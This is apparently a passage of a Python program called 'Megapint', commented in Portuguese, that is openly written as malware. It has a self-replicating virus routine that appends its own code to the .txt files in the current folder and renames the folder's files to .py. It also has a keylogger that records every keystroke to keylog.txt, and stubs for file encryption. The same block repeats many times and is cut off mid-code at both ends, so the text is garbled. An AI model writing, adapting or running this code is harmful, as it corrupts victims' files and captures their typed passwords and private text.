        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
